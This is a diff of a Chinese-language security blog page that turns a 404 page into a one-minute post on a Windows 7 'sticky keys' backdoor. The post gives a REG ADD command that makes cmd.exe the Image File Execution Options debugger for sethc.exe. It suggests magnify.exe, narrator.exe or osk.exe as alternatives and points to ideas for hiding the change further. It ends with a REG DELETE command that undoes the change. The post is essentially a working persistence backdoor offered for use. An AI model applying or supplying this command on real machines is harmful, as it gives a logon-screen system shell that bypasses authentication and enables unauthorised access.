@@ -5,7 +5,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-<title>404</title>
+<title>win7粘滞键后门</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="https://gmpg.org/xfn/11" />
@@ -85,51 +85,117 @@
 
     <div class="page-content">
       <div class="wrap">
-      <div class="container-fluid index error">
+      
+
+<div class="container-fluid single">
   <div class="row">
 
-    <div class="col-md-12 content-panel articles">
-      <h1 class="header author-header">404</h1>
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
 
-      <div class="error-text">
-        Sorry but this page doesn't seem to exist.
+      <h1 class="header" itemprop="name">win7粘滞键后门</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">August 3, 2017</span>
+           under web
+        </i></small>
       </div>
 
-      <div class="error-text">
-        <a href="/">Home</a> |
-        <a href="/posts/">All Posts</a> |
-        <a href="/search/">Search</a>
+      <div class="read-time">
+        <small>
+          1 minute read
+        </small>
       </div>
 
-      <p class="links">
-  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
-  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
-  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
-</p>
+      <div class="content-panel content">
 
+        
+
+        <span itemprop="articleBody"><p>以管理员身份打开cmd.exe运行如下:</p>
+
+<p>’’’
+REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe” /v Debugger /t REG_SZ /d “C:\windows\system32\cmd.exe”
+‘’’</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe</td>
+      <td>osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥:</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><a href="https://answers.microsoft.com/en-us/windows/forum/windows_7-performance/run-command/a2632e97-c8d1-4ab3-8df2-7e70a4448267">AsULike</a></p>
+
+<p>删除后门以管理员身份打开cmd.exe运行如下即可:</p>
+
+<p>’’’
+REG DELETE “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe”
+‘’’</p>
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            后门, win7
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+      <div class="content-panel feedback">
+        I <i class="fa fa-heart"></i> feedback.<br />
+        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a>!
+      </div>
+      
+
+
+      
+
+
+<!-- 个人增加织网背景效果 -->
+<!--
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+
+      
+
+
+
+      
+<!--PC和WAP自适应版-->
+<div id="SOHUCS" style="width:980px"></div> 
+<script type="text/javascript"> 
+(function(){ 
+var appid = 'cyt1tnTcP'; 
+var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
+var width = window.innerWidth || document.documentElement.clientWidth; 
+if (width < 960) { 
+window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
+      
+
+
+      
 
     </div>
 
   </div>
 
-  <div class="content-panel related">
-    
-      <div class="related-header">
-        <a href="/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">Suggested Article</a>
-      </div>
-      <div class="title">
-        <a href="/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">win7粘滞键后门</a>
-      </div>
-      <div class="excerpt">
-         
-          win7粘滞键后门
-         
-        <a href="/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">Continue Reading</a>
-      </div>
-    
-  </div>
-
 </div>
+
+
+
+
 
       </div>
     </div>
